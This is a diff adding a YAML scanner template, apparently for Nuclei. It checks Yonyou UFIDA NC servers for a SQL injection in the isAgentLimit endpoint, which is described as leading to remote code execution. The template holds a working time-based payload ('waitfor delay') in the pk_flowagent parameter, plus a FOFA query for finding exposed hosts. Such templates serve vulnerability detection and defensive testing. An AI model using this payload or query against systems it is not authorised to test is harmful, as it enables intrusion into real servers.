@@ -1,0 +1,32 @@
+id: yonyou-UFIDA-NC-oacoSchedulerEvents-isAgentLimit-sqli
+
+info:
+  name: 用友NC /oacoSchedulerEvents/isAgentLimit SQL注入致RCE
+  author: onewini
+  severity: high
+  description: 用友NC /oacoSchedulerEvents/isAgentLimit SQL注入致RCE
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,sqli
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=3 && duration<5' 
+            - 'status_code_1 == 200'
+          condition: and
